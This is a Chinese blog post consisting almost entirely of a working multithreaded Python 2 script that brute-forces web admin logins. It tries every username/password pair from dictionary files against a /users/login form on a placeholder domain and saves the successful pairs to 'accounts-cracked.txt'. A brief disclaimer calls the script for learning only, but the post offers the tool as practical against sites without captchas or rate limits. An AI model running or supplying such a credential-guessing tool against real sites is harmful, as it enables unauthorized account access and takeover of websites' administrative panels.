# python 写的http后台弱口令爆破工具

今天来弄一个后台破解的Python小程序，哈哈，直接上代码吧，都有注释~~

    
    
    # -*- coding: utf-8 -*-
    # 利用python 写的多线程爆破后台用户名+密码(自备字典),比较实用,即使是在信息安全这么重视的今天,还是有人不加验证码或者异常访问限制之类的登陆验证方式,这样就很# 容易被弱口令爆破工具拿下,(本代码仅限学习实用,禁止进行web攻击,不承担法律责任)
    import urllib2
    import urllib
    import httplib
    import threading
     
    headers = {"Content-Type":"application/x-www-form-urlencoded",     
               "Connection":"Keep-Alive",
               "Referer":"http://www.xxxxx.com/"};# referer:是代理的访问来源地址
    # lock = threading.Lock()
    def tryUser(user,password):
        #print user,password
        global headers
        global outFile 
        conn = httplib.HTTPConnection("www.xxxxx.com") # 远程域名
        if len(user) < 3:     # 限制用户名长度，排除字典中的无用数据
            return  # 主动退出线程
        else:
            #lock.acquire()   # 多线程操作文件，提前加锁，用后释放
            #line = inFile.readline()
             
            #userData = line.strip().split(' # ') # strip() 默认去除空白字符包括' ','\t','\n'等
            #lock.release()
     
            user = user.strip()
            passwd = password.strip()
            params = urllib.urlencode({'username': user, 'password': passwd})
            conn.request(method="POST", url="/users/login", body=params, headers=headers) # 后台路径
            responseText = conn.getresponse().read().decode('utf8') # 网页编码
            #print responseText  # 第一次可以打印看看是否解析
            if not responseText.find(u'用户名或者密码不正确,请重新输入!') > 0 :
                print '----- find user:', user, 'with password:', passwd, '-----'
                outFile.write(user + '    ' +  passwd + '\n')
                 
        return
     
    outFile = open('accounts-cracked.txt', 'w')
     
    if __name__ == '__main__':
        tsk=[] # 创建线程池
        with open(r'user.dic', 'r') as fUser:  # 使用with as 来打开文件,不需自己关闭文件,因为他会自己在合适的时候自已关闭(类似C# 中的using(...){}接口)
            with open(r'pass.dic', 'r') as fPass:
                for user in fUser.readlines():
                    for password in fPass.readlines():
                        t= threading.Thread(target = tryUser,args=(user,password))
                        t.daemon = False # 设置不进行进程守护
                        tsk.append(t) # t.start()
                    fPass.seek(0)
                    # 记住这里要将文件重新移到文件首,不然就会出现只执行外层循环的第一条,因为内层在
                    # 迭代之后(readlines()是迭代器的形式,迭代一次后文件指针就指到文件尾了,迭代器
                    # 也是end了)第二次就没有password 在 fPass中,也就是说 for  password in fPass.readlines():
                    # 为空,所以这里的内层循环就不会被执行了,因此也就是迭代器清零的问题(C ++ itertor 常有)
                      
                         
    # join()无参数就是完全阻塞主线程,等待线程执行完 有参数就是说，
    # 在主线程等待一秒后就不阻塞线程了,继续执行主线程,这里的意思是一秒钟开一个线程
    # 不能再thread start之前调用join(), 因为join() 是线程运行时调度
        for t in tsk:
            t.start()
            t.join(1) 
     
     
     
        print "All thread OK,maybe not "
        outFile.close()

  

